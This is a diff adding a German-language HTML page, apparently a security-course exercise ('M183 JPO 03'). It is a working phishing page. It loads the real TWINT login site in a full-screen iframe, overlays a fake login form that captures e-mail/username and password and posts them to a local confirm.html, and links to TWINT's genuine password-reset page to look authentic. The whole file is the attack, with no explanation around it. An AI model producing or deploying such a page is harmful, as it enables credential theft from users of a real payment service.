@@ -1,0 +1,44 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+	<meta charset="utf-8"/>
+	<title>M183 JPO 03</title>
+	<link rel="stylesheet" type="text/css" href="frontend.css">
+</head>
+<body style="overflow:hidden;">
+	<iframe 
+		src="https://www.twint.ch/login/" 
+		style="border:0px #ffffff none;
+		position: absolute;
+		height:auto;
+		width:100%;
+		height:100%;
+		overflow:hidden;"
+		scrolling="no"
+	></iframe>
+
+	<div class="form-center">
+		<div class="list-errors">
+			<ul></ul>
+		</div>
+		<form action="confirm.html" name="loginform" method="post" style="position:absolute;z-index:1;top:410px;width:500px;height:350px;margin:auto;">
+			<div class="frm_form_fields">
+				<div class="frm_text_container frm_form_field form-field">
+					<label for="user_email">E-Mail oder Benutzername</label>
+					<input name="email" id="user_email" size="20" class="input" type="text">
+					<span class="highlight"></span><span class="bar"></span>
+				</div>
+				<div class="frm_text_container frm_form_field form-field">
+					<label for="user_password">Passwort</label>
+					<input name="password" id="user_password" size="20" class="input" type="password">
+					<span class="highlight"></span><span class="bar"></span>
+				</div>
+				<div class="frm_submit">
+					<button type="submit" name="wp-submit" class="btn btn-warning">Login</button>
+				</div>
+			</div>
+		<p class="mt-large"><a href="https://www.twint.ch/lost-password/">Passwort vergessen</a></p>
+		</form>
+	</div>
+</body>
+</html>
